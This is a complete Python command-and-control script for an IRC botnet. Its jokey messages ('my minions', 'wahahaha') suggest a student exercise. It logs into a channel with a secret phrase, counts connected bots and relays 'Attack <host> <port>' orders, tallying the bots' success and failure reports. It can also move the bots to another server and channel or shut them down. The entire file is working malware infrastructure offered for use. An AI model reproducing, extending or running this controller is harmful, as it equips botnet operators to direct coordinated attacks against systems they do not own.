import sys, os
import socket
import select
import signal


def joinIRC(irc):
    # initialisation stugg
    nickname = "BetterThanYou"
    irc.send(bytes("USER TheController 8 * : I'm The Best\r\n", "utf-8"))
    irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
    ready = select.select([irc], [], [], 1) # wait 1 second
    if ready[0]:
        response = (irc.recv(1024)).decode("utf-8")
        print(response)
        while "Nickname is already in use" in response:
            nickname = "Way" + nickname
            irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
            ready = select.select([irc], [], [], 1) # wait 1 second
            if ready[0]:
                response = (irc.recv(1024)).decode("utf-8")
            else: continue
    irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
    irc.send(bytes("PRIVMSG #" + channel + " :" + secretphase + "\r\n", "utf-8"))
    return nickname

try:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    secretphase = sys.argv[4]
except:
    print("must state host name, port, channel, and secret phase\n\rexiting...", file=sys.stderr)
    sys.exit(-1)

# connect to irc
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# wait 5 seconds until connected
irc.settimeout(5)
while 1:
    try:
        irc.connect((hostname, port))
        irc.settimeout(None)    # if reaches here, it connected, yay
        break
    except:
        sys.exit(-1)    # if reaches here, wasn't able to connect, noo
irc.setblocking(0)

# some initialising stuff
nickname = joinIRC(irc)

minions = []
response = ""
command = ""
print("It is I, the best controller evarrr. Connecting with nick: " + nickname)
atk_count = 0
fail_count = 0

while 1:
    command = ""
    ready = select.select([irc,], [], [], 2) # wait 2 seconds
    if ready[0]:
        response = (irc.recv(1024)).decode("utf-8")
        print(response)
        if response == "":  # if connection is closed
            # try to reconnect
            irc.close()
            irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            irc.settimeout(5)
            print("attempting to reconnect")
            while 1:
                try:
                    irc.connect((hostname, port))
                    irc.settimeout(None)    # if reached here, it reconnected, yay
                    print("reconnection success")
                    joinIRC(irc)
                    break
                except socket.timeout:
                    print("timeout, time to go home")
                    sys.exit(-1) # timeout, just give up and quit
                except Exception as e:
                    continue
    else:
        command = input("State thy command> ")

    if response.split(" ", 1)[0] == "PING":
        argument = response.split(" ", 2)[1]
        irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))

    # Status
    if command == "status":
        irc.send(bytes("PRIVMSG #" + channel + " :To me, my minions\r\n", "utf-8"))
        print("Calling all of my minions to answer back to me")
        minions = []
        while 1:
            ready = select.select([irc], [], [], 3) # wait 2 seconds
            if ready[0]:
                response = (irc.recv(1024)).decode("utf-8")
                for i, m in enumerate(response.split()):
                    if nickname in m:
                        follower = response.split()[i+1].strip(":")
                        if follower.strip("\r\n") not in minions:
                            minions.append(follower.strip("\r\n"))
            else: break
        if len(minions) < 1:
            print("Where are my minions? I have none...")
        else:
            print("I have", len(minions), "minion(s) wahahaha")
            naming = ""
            for i, m in enumerate(minions):
                if i == 0:
                    naming = m
                else:
                    naming = naming + ", " + m
            print("Minions: " + naming + ".")

    # Attack
    if command.split(" ", 1)[0] == "attack":
        try:
            hostname = command.split(" ", 2)[1]
            port = command.split(" ", 3)[2]
            irc.send(bytes("PRIVMSG #" + channel + " :Attack " + hostname + " " + port + "\r\n", "utf-8"))
            # wait for bots to tell status of attack
            fail_count = 0
            atk_count = 0
            while 1:
                ready = select.select([irc], [], [], 3) # wait 3 seconds
                if ready[0]:
                    response = (irc.recv(1024)).decode("utf-8")
                    for i, m in enumerate(response.split()):
                        if m == ":attack": # they are speaking about attacking
                            minion = response.split()[i-3]
                            minion = minion.strip(":")
                            minion = minion.split("!", 1)[0]
                            # check if success or failiure
                            if response.split()[i+1] == "unsuccessful":
                                print(minion + ": Attack failed!")
                                fail_count = fail_count + 1
                            else:   # success!
                                print(minion + ": Attack successful!")
                                atk_count = atk_count + 1
                else: break
            print("successful attack count: " + str(atk_count) + ", unsuccessful attack count: " + str(fail_count))
        except Exception as e:
            print("O M Goodnesses, do it right next time! Error:", e)

    # Move
    if command.split(" ", 1)[0] == "move":
        try:
            hostname = command.split(" ", 2)[1]
            port = command.split(" ", 3)[2]
            move_channel = command.split(" ", 4)[3]
            irc.send(bytes("PRIVMSG #" + channel + " :Move " + hostname + " " + port + " " + move_channel + "\r\n", "utf-8"))
            # wait for bots to tell status of move
            left = 0
            notleft = 0
            while 1:
                ready = select.select([irc], [], [], 3) # wait 3 seconds
                if ready[0]:
                    response = (irc.recv(1024)).decode("utf-8")
                    for i, m in enumerate(response.split()):
                        if m == ":move": # they are speaking about moving
                            minion = response.split()[i-3]
                            minion = minion.strip(":")
                            minion = minion.split("!", 1)[0]
                            # check if success or failiure
                            if response.split()[i+1] == "unsuccessful":
                                print(minion + ": Move failed!")
                                notleft = notleft + 1
                            else:   # success!
                                print(minion + ": Move successful!")
                                left = left + 1
                else: break
            print(left, "of my minions moved successfully")
            print(notleft, "of my minions failed moving")
        except Exception as e:
            print("O M Goodnesses, do it right next time! Error: ", e)

    # Quit
    if command == "quit":
        irc.send(b"QUIT\r\n")
        sys.exit(0)

    # Shutdown
    if command == "shutdown":
        irc.send(bytes("PRIVMSG #" + channel + " :Go home, guys\r\n", "utf-8"))
        gone = 0
        while 1:
            ready = select.select([irc], [], [], 3) # wait 3 seconds
            if ready[0]:
                response = (irc.recv(1024)).decode("utf-8")
                for i, m in enumerate(response.split()):
                    if m == "QUIT": # they are speaking about moving
                        minion = response.split()[i+1]
                        minion = minion.strip(":")
                        minion = minion.strip("\r\n")
                        gone = gone + 1
            else: break
        print(gone, "of minions have left")
